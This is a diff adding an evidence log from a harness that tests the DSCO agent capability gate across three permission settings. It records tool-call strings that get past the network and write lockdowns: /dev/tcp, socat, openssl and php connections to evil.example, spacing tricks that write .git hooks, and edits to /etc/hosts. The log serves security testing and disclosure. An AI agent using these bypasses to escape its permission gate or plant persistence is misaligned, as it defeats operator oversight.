@@ -1,0 +1,122 @@
+############ DSCO capability-gate harness — evidence ############
+Repo:   https://github.com/arthurcolle/dsco.git
+Commit: ec8738b05d855782b4df27c0850c97258edd83dd (2026-10-18)
+Build:  gcc -Iinclude harness.c src/capability.c src/surface_policy.c src/json_util.c stubs.c -o dsco_gate_harness
+Tier:   standard
+
+############ RUN A: DSCO_ALLOW_NET=0 DSCO_ALLOW_WRITE=0 DSCO_ALLOW_RUN=1 ############
+tier=standard
+DSCO_ALLOW_NET=0 DSCO_ALLOW_WRITE=0 DSCO_ALLOW_RUN=1 DSCO_ALLOW_CONTROL=(unset)
+
+=== FINDING 1: DSCO_ALLOW_NET=0 / DSCO_ALLOW_WRITE=0 lockdown not enforced ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"curl https://evil.example/x"}            DENY       caps=read net exec untrusted_in   capability 'net' explicitly disabled (DSCO_ALLOW_NET=0) for tool 'bash'
+{"command":"echo hi > /tmp/f"}                       DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+{"command":"bash -c 'exec 3<>/dev/tcp/evil.example/443'"} ALLOW      caps=read exec                    
+{"command":"socat - TCP:evil.example:80"}            ALLOW      caps=read exec                    
+{"command":"openssl s_client -connect evil.example:443"} ALLOW      caps=read exec                    
+{"command":"perl -e 'use IO::Socket::INET;'"}        ALLOW      caps=read exec                    
+{"command":"php -r 'fsockopen(\"evil.example\",80);'"} ALLOW      caps=read exec                    
+{"command":"echo hi>/tmp/f"}                         ALLOW      caps=read exec                    
+{"command":"sed -i s/a/b/ /etc/hosts"}               ALLOW      caps=read exec                    
+
+=== FINDING 2: .git control-plane write guard bypassed via bash ===
+CALL                                                 DECISION   CAPS                         REASON
+{"file_path":"/repo/.git/hooks/pre-commit","content":"x"} DENY       caps=read fs_write                capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'write_file'
+{"file_path":"/repo/.git/config","content":"x"}      DENY       caps=read fs_write                capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'write_file'
+{"command":"echo x > /repo/.git/hooks/pre-commit"}   DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+{"command":"echo x>/repo/.git/hooks/pre-commit"}     ALLOW      caps=read exec                    
+{"command":"cp /tmp/evil /repo/.git/hooks/pre-commit"} DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+{"command":"printf x >> /repo/.git/config"}          DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+{"command":"echo x > /etc/passwd"}                   DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+
+=== FINDING 3: documented read-only governance exemption not implemented ===
+CALL                                                 DECISION   CAPS                         REASON
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"trigger"}                                 DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{}                                                   DENY       caps=control                      control capability denied: 'gate_status' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'governance' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+
+=== FINDING 4: control-plane write guard is field-shape-only (boolean posture) ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"cp /tmp/e /repo/.git/hooks/pre-commit"}  DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+{"code":"open('/repo/.git/hooks/pre-commit','w').write('x')"} ALLOW      caps=read exec                    
+{"command":"echo x > /srv/app/.git/config"}          DENY       caps=read fs_write exec           capability 'fs_write' explicitly disabled (DSCO_ALLOW_WRITE=0) for tool 'bash'
+
+############ RUN B: DSCO_ALLOW_WRITE=1 DSCO_ALLOW_RUN=1 (CONTROL unset) ############
+tier=standard
+DSCO_ALLOW_NET=(unset) DSCO_ALLOW_WRITE=1 DSCO_ALLOW_RUN=1 DSCO_ALLOW_CONTROL=(unset)
+
+=== FINDING 1: DSCO_ALLOW_NET=0 / DSCO_ALLOW_WRITE=0 lockdown not enforced ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"curl https://evil.example/x"}            ALLOW      caps=read net exec untrusted_in   
+{"command":"echo hi > /tmp/f"}                       ALLOW      caps=read fs_write exec           
+{"command":"bash -c 'exec 3<>/dev/tcp/evil.example/443'"} ALLOW      caps=read exec                    
+{"command":"socat - TCP:evil.example:80"}            ALLOW      caps=read exec                    
+{"command":"openssl s_client -connect evil.example:443"} ALLOW      caps=read exec                    
+{"command":"perl -e 'use IO::Socket::INET;'"}        ALLOW      caps=read exec                    
+{"command":"php -r 'fsockopen(\"evil.example\",80);'"} ALLOW      caps=read exec                    
+{"command":"echo hi>/tmp/f"}                         ALLOW      caps=read exec                    
+{"command":"sed -i s/a/b/ /etc/hosts"}               ALLOW      caps=read exec                    
+
+=== FINDING 2: .git control-plane write guard bypassed via bash ===
+CALL                                                 DECISION   CAPS                         REASON
+{"file_path":"/repo/.git/hooks/pre-commit","content":"x"} DENY       caps=read fs_write                VCS control-plane write denied: '/repo/.git/hooks/pre-commit' targets .git hooks/config (persistence/exfil vector); set DSCO_ALLOW_CONTROL=1 to authorize
+{"file_path":"/repo/.git/config","content":"x"}      DENY       caps=read fs_write                VCS control-plane write denied: '/repo/.git/config' targets .git hooks/config (persistence/exfil vector); set DSCO_ALLOW_CONTROL=1 to authorize
+{"command":"echo x > /repo/.git/hooks/pre-commit"}   ALLOW      caps=read fs_write exec           
+{"command":"echo x>/repo/.git/hooks/pre-commit"}     ALLOW      caps=read exec                    
+{"command":"cp /tmp/evil /repo/.git/hooks/pre-commit"} ALLOW      caps=read fs_write exec           
+{"command":"printf x >> /repo/.git/config"}          ALLOW      caps=read fs_write exec           
+{"command":"echo x > /etc/passwd"}                   ALLOW      caps=read fs_write exec           
+
+=== FINDING 3: documented read-only governance exemption not implemented ===
+CALL                                                 DECISION   CAPS                         REASON
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"trigger"}                                 DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{}                                                   DENY       caps=control                      control capability denied: 'gate_status' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'governance' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+
+=== FINDING 4: control-plane write guard is field-shape-only (boolean posture) ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"cp /tmp/e /repo/.git/hooks/pre-commit"}  ALLOW      caps=read fs_write exec           
+{"code":"open('/repo/.git/hooks/pre-commit','w').write('x')"} ALLOW      caps=read exec                    
+{"command":"echo x > /srv/app/.git/config"}          ALLOW      caps=read fs_write exec           
+
+############ RUN C: DSCO_ALLOW_WRITE=/tmp/ws DSCO_ALLOW_RUN=1 (scoped) ############
+tier=standard
+DSCO_ALLOW_NET=(unset) DSCO_ALLOW_WRITE=/tmp/ws DSCO_ALLOW_RUN=1 DSCO_ALLOW_CONTROL=(unset)
+
+=== FINDING 1: DSCO_ALLOW_NET=0 / DSCO_ALLOW_WRITE=0 lockdown not enforced ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"curl https://evil.example/x"}            ALLOW      caps=read net exec untrusted_in   
+{"command":"echo hi > /tmp/f"}                       DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+{"command":"bash -c 'exec 3<>/dev/tcp/evil.example/443'"} ALLOW      caps=read exec                    
+{"command":"socat - TCP:evil.example:80"}            ALLOW      caps=read exec                    
+{"command":"openssl s_client -connect evil.example:443"} ALLOW      caps=read exec                    
+{"command":"perl -e 'use IO::Socket::INET;'"}        ALLOW      caps=read exec                    
+{"command":"php -r 'fsockopen(\"evil.example\",80);'"} ALLOW      caps=read exec                    
+{"command":"echo hi>/tmp/f"}                         ALLOW      caps=read exec                    
+{"command":"sed -i s/a/b/ /etc/hosts"}               ALLOW      caps=read exec                    
+
+=== FINDING 2: .git control-plane write guard bypassed via bash ===
+CALL                                                 DECISION   CAPS                         REASON
+{"file_path":"/repo/.git/hooks/pre-commit","content":"x"} DENY       caps=read fs_write                VCS control-plane write denied: '/repo/.git/hooks/pre-commit' targets .git hooks/config (persistence/exfil vector); set DSCO_ALLOW_CONTROL=1 to authorize
+{"file_path":"/repo/.git/config","content":"x"}      DENY       caps=read fs_write                VCS control-plane write denied: '/repo/.git/config' targets .git hooks/config (persistence/exfil vector); set DSCO_ALLOW_CONTROL=1 to authorize
+{"command":"echo x > /repo/.git/hooks/pre-commit"}   DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+{"command":"echo x>/repo/.git/hooks/pre-commit"}     ALLOW      caps=read exec                    
+{"command":"cp /tmp/evil /repo/.git/hooks/pre-commit"} DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+{"command":"printf x >> /repo/.git/config"}          DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+{"command":"echo x > /etc/passwd"}                   DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+
+=== FINDING 3: documented read-only governance exemption not implemented ===
+CALL                                                 DECISION   CAPS                         REASON
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"trigger"}                                 DENY       caps=control                      control capability denied: 'killswitch' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{}                                                   DENY       caps=control                      control capability denied: 'gate_status' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+{"action":"status"}                                  DENY       caps=control                      control capability denied: 'governance' would modify the gate/governance (grant DSCO_ALLOW_CONTROL=1 to authorize)
+
+=== FINDING 4: control-plane write guard is field-shape-only (boolean posture) ===
+CALL                                                 DECISION   CAPS                         REASON
+{"command":"cp /tmp/e /repo/.git/hooks/pre-commit"}  DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
+{"code":"open('/repo/.git/hooks/pre-commit','w').write('x')"} ALLOW      caps=read exec                    
+{"command":"echo x > /srv/app/.git/config"}          DENY       caps=read fs_write exec           scoped write grant requires explicit structured path for exec-capable tool 'bash'
